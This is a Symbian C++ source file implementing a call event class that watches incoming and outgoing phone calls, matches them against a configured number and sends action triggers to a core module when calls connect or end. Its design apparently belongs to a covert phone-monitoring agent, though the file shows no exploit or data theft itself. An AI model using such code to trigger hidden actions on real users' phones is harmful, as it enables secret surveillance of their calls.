/*
 * EventCall.cpp
 *
 *  Created on: 06/ott/2010
 *      Author: Giovanna
 */

#include "EventCall.h"

CEventCall::CEventCall(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Call, aTriggerId)
	{
	// No implementation required
	}

CEventCall::~CEventCall()
	{
	//__FLOG(_L("Destructor"));
	delete iCallMonitor;
	//__FLOG(_L("End Destructor"));
	//__FLOG_CLOSE;
	} 

CEventCall* CEventCall::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = new (ELeave) CEventCall(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventCall* CEventCall::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventCall* self = CEventCall::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventCall::ConstructL(const TDesC8& params)
	{
	//__FLOG_OPEN_ID("HT", "EventCall.txt");
	//__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	Mem::Copy(&iCallParams, iParams.Ptr(), sizeof(TCallStruct));
	ptr += sizeof(TCallStruct);
		
	if (iCallParams.iNumLen > 2)  //when telephone number is empty, this counts only NULL WCHAR (2 bytes)
		{
		TUint8 totChars = (iCallParams.iNumLen-1) / 2;
		TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
		iTelNumber.Copy(ptrNum);  
		}
	
	iCallMonitor = CPhoneCallMonitor::NewL(*this);
	}

void CEventCall::StartEventL()
	{
	iWasInMonitoredCall = EFalse;
	
	TBuf<16>  telNumber;
	if(iCallMonitor->ActiveCall(telNumber))
		{
		if(iCallParams.iNumLen<=2)  //we don't have to match a number
			{
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			}
		else					
			{
			if(telNumber.Length()==0)  // private number calling
				{
				return;
				}
			if(MatchNumber(telNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				}
			}
		}
	iCallMonitor->StartListeningForEvents();
	}

// aNumber.Length()==0  when private number calling
void CEventCall::NotifyConnectedCallStatusL(const TDesC& aNumber)
	{
	if(!iWasInMonitoredCall)
		{
		if(iCallParams.iNumLen<=2)
			{
			// no number to match, trigger action
			iWasInMonitoredCall = ETrue;
			SendActionTriggerToCoreL();
			}
		else
			{
			// there's a number to match
			if(aNumber.Length()==0) // private number, do nothing
				{
				return;
				}
			if(MatchNumber(aNumber))
				{
				iWasInMonitoredCall = ETrue;
				SendActionTriggerToCoreL();
				}
			}
		}
	}

void CEventCall::NotifyDisconnectedCallStatusL()
	{
	if(iWasInMonitoredCall)
		{
		iWasInMonitoredCall = EFalse;
		if (iCallParams.iExitAction != 0xFFFFFFFF)						
			SendActionTriggerToCoreL(iCallParams.iExitAction);
		}
	}

TBool CEventCall::MatchNumber(const TDesC& aNumber)
	{
	if(aNumber.Length() <= iTelNumber.Length())
		{
		if(iTelNumber.Find(aNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	else
		{
		if(aNumber.Find(iTelNumber) != KErrNotFound)
			{
			return ETrue;
			}
		}
	return EFalse;
	}
